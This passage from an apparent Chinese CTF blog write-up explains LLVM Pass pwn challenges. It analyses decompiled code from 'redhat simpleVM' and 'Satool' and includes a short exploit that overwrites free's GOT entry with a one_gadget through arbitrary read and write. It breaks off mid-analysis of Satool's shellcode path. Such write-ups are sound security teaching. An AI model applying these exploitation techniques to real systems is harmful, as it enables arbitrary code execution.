class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="built_in">end</span>();</span><br><span class="line">      <span class="keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter=F.<span class="built_in">begin</span>(); bbIter!=bbEnd; ++bbIter)&#123;</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="built_in">begin</span>();</span><br><span class="line">         SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="built_in">end</span>();</span><br><span class="line">         <span class="keyword">for</span>(; instIter != instEnd; ++instIter)&#123;</span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;opcode=&quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getOpcodeName</span>() &lt;&lt; <span class="string">&quot; NumOperands=&quot;</span> &lt;&lt; instIter-&gt;<span class="built_in">getNumOperands</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>现在在刚刚的基础上对函数的代码进行遍历操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tcdy@ubuntu:~$ opt -load ./test.so -hello ./test.ll</span><br><span class="line">WARNING: You<span class="string">&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br><span class="line">opcode=alloca NumOperands=1</span><br><span class="line">opcode=getelementptr NumOperands=3</span><br><span class="line">opcode=call NumOperands=4</span><br><span class="line">opcode=getelementptr NumOperands=3</span><br><span class="line">opcode=call NumOperands=4</span><br><span class="line">opcode=call NumOperands=2</span><br><span class="line">opcode=ret NumOperands=1</span><br></pre></td></tr></table></figure><p>最后可以看到拿到了函数中的指令操作</p><h3 id="LLVM-PASS逆向分析"><a href="#LLVM-PASS逆向分析" class="headerlink" title="LLVM PASS逆向分析"></a>LLVM PASS逆向分析</h3><p>一般来说LLVM PASS pwn都是对函数进行PASS操作，所以我们首先要找到runOnFunction函数时如何重写的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727153234091.png"                      alt="image-20220727153234091"                ></p><p>一般来说runOnFunction都会在函数表的最下面</p><h2 id="2021-redhat-simpleVM"><a href="#2021-redhat-simpleVM" class="headerlink" title="2021 redhat simpleVM"></a>2021 redhat simpleVM</h2><p>首先找到上面所述的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="keyword">const</span> <span class="keyword">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里验证的是函数名是否为<code>o0o0o0o0</code>然后进入：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, v3);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里则是遍历函数中的每一个basicblock，取出之后进入sub_6b80函数进一步处理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">0x37</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">        &#123;</span><br><span class="line">            s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">            CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">            Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">            *(_QWORD *)s1 = *Name;</span><br><span class="line">            *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">            *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">            *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>这里呢则是遍历basicblock中的每一个操作指令，后续就是类似于vm-pwn中对相应的指令做相应的处理。这里重点关注三段代码即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">        v24 = <span class="number">0LL</span>;</span><br><span class="line">        v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">        &#123;</span><br><span class="line">            v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">            <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = REG1;</span><br><span class="line">            <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v24 == REG1 )</span><br><span class="line">        &#123;</span><br><span class="line">            **(_QWORD **)REG1 = *(_QWORD *)REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == REG2 )</span><br><span class="line">        &#123;</span><br><span class="line">            **(_QWORD **)REG2 = *(_QWORD *)REG1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到指令为store时，通过第一个参数来决定下面是什么寄存器来进行赋值，如果我们可以操控寄存器也就可以实现任意地址写了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">        v20 = <span class="number">0LL</span>;</span><br><span class="line">        v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">        <span class="keyword">if</span> ( v19 )</span><br><span class="line">        &#123;</span><br><span class="line">            v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">            <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = REG1;</span><br><span class="line">            <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v20 == REG1 )</span><br><span class="line">            *(_QWORD *)REG2 = **(_QWORD **)REG1;</span><br><span class="line">        <span class="keyword">if</span> ( v20 == REG2 )</span><br><span class="line">            *(_QWORD *)REG1 = **(_QWORD **)REG2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面同理，如果可以操控寄存器就可以任意地址读了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">        v16 = <span class="number">0LL</span>;</span><br><span class="line">        v15 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">        <span class="keyword">if</span> ( v15 )</span><br><span class="line">        &#123;</span><br><span class="line">            v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = REG1;</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">        &#123;</span><br><span class="line">            v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v12 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">            <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们就可以控制寄存器了</p><p>可以在上面看到，这里的指令是放在malloc出来的堆块上面的，并且程序的循环最后会free掉堆块，那么我们的思路就是修改free的got表为one_gadget</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Satool"><a href="#Satool" class="headerlink" title="Satool"></a>Satool</h2><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Introduction</span></span><br><span class="line"></span><br><span class="line">A LLVM Pass that can optimize add/sub instructions.</span><br><span class="line"></span><br><span class="line"><span class="comment">## How to run</span></span><br><span class="line"></span><br><span class="line">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class="line"></span><br><span class="line"><span class="comment">## Example</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### IR before optimization</span></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr <span class="comment">#0 &#123;</span></span><br><span class="line">  %<span class="attr">2</span> = sub nsw i64 %<span class="number">0</span>, <span class="number">2</span></span><br><span class="line">  %<span class="attr">3</span> = add nsw i64 %<span class="number">2</span>, <span class="number">68</span></span><br><span class="line">  %<span class="attr">4</span> = add nsw i64 %<span class="number">0</span>, <span class="number">6</span></span><br><span class="line">  %<span class="attr">5</span> = add nsw i64 %<span class="number">4</span>, -<span class="number">204</span></span><br><span class="line">  %<span class="attr">6</span> = add nsw i64 %<span class="number">5</span>, %<span class="number">3</span></span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="comment">### IR after optimization</span></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr <span class="comment">#0 &#123;</span></span><br><span class="line">  %<span class="attr">2</span> = mul i64 %<span class="number">0</span>, <span class="number">2</span></span><br><span class="line">  %<span class="attr">3</span> = add i64 %<span class="number">2</span>, -<span class="number">132</span></span><br><span class="line">  ret i64 %3</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>首先看题目的readme文件，可以从before和after的对比看出来这里做的是压缩优化IR指令，并且限制了只能是sub或者add或者ret</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727154845308.png"                      alt="image-20220727154845308"                ></p><p>可以看到这道题的runOnFunction更是直接给了出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v30 = <span class="keyword">this</span>;</span><br><span class="line">v29 = a2;</span><br><span class="line">v28 = <span class="number">0</span>;</span><br><span class="line">v2 = a2;</span><br><span class="line"><span class="keyword">if</span> ( llvm::Function::<span class="built_in">arg_size</span>(a2) != <span class="number">1</span> || (v2 = v29, llvm::Function::<span class="built_in">size</span>(v29) != <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    v3 = llvm::<span class="built_in">errs</span>(v2);</span><br><span class="line">    llvm::raw_ostream::<span class="keyword">operator</span>&lt;&lt;(v3, <span class="string">&quot;Function has more than one argument or basicblock\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>[<span class="number">5</span>] = <span class="keyword">this</span>[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">mprotect</span>(<span class="keyword">this</span>[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">`anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">handle</span>((_anonymous_namespace_::MBAPass *)<span class="keyword">this</span>, v29);</span><br><span class="line">    <span class="built_in">mprotect</span>(<span class="keyword">this</span>[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">v27 = `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">callCode</span>((_anonymous_namespace_::MBAPass *)<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>可以看到函数的开始验证了参数和基本块只允许有一个，然后通过handle函数之后执行callCode函数，并且在handle处理之前内存的权限为可读可写，随后改为了可读可执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">callCode</span>(</span><br><span class="line">        __int64 (__fastcall **<span class="keyword">this</span>)(_anonymous_namespace_::MBAPass *, __int64),</span><br><span class="line">        __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>[<span class="number">4</span>]((_anonymous_namespace_::MBAPass *)<span class="keyword">this</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到callCode函数是将this[4]直接执行，那么意思很明显就是写shellcode。所以重点还是需要看handle函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">v32 = <span class="keyword">this</span>;</span><br><span class="line">v31 = a2;</span><br><span class="line">v30 = *((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) + <span class="number">0xFF0</span>LL;</span><br><span class="line">v29 = (llvm::BasicBlock *)llvm::Function::<span class="built_in">front</span>(a2);</span><br><span class="line">Terminator = (llvm::User *)llvm::BasicBlock::<span class="built_in">getTerminator</span>(v29);</span><br><span class="line">Operand = llvm::User::<span class="built_in">getOperand</span>(Terminator, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">    v2 = (llvm::ConstantInt 